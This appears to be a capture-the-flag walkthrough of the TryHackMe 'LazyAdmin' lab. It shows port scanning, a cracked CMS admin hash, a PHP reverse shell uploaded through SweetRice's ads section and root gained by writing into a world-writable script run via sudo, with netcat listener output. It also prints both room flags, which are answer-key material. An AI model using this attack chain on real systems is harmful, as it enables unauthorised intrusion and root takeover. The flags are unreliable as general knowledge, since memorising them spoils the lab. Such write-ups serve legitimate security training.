# LazyAdmin

Easy linux machine to practice your skills

Room URL: https://tryhackme.com/room/lazyadmin

---

# Task 1

No info given. Guess we should just start with a portscan. Just two open ports..

```bash
$ nmap -sC -sV 10.10.6.232
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 19:46 CEST
Nmap scan report for 10.10.6.232
Host is up (0.082s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's give gobuster a run for his money. So there's a SweetRice CMS at
`/content` which has an admin panel at `/content/as`. Seems with some googling
we're able to find a [database
dump](http://10.10.6.232/content/inc/mysql_backup/) containing a password hash:
`42f749ade7f9e195bf475f37a44cafcb` and thanks to
[hashes.com](https://hashes.com/en/decrypt/hash) I found the corresponding
password: `Password123`

After some googling I found it's possible to use the "ads" section to upload my [php reverse
shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
and use the direct link to said ad to get a reverse shell, which works :)

```bash
$ nc -lnvp 9999
Connection from 10.10.6.232:38210
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 21:04:58 up 20 min,  0 users,  load average: 0.00, 0.13, 0.41
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

1. What is the user flag?

Seems there's a flag in the homedir of `itguy`: `/home/itguy/user.txt`

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

2. What is the root flag?

`sudo -l` shows we can run a very specific backup script:

```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

The contents of this file runs a shell command `/etc/copy.sh` which is is
world-writeable. Good news! So we could just open another nc listener on our own
machine and insert a reverse shell into that file and then run the sudo command
which pops us into root.

```
$ nc -lnvp 8888
Connection from 10.10.6.232:59994
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root.txt
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

```
THM{6637f41d0177b6f37cb20d775124699f}
```
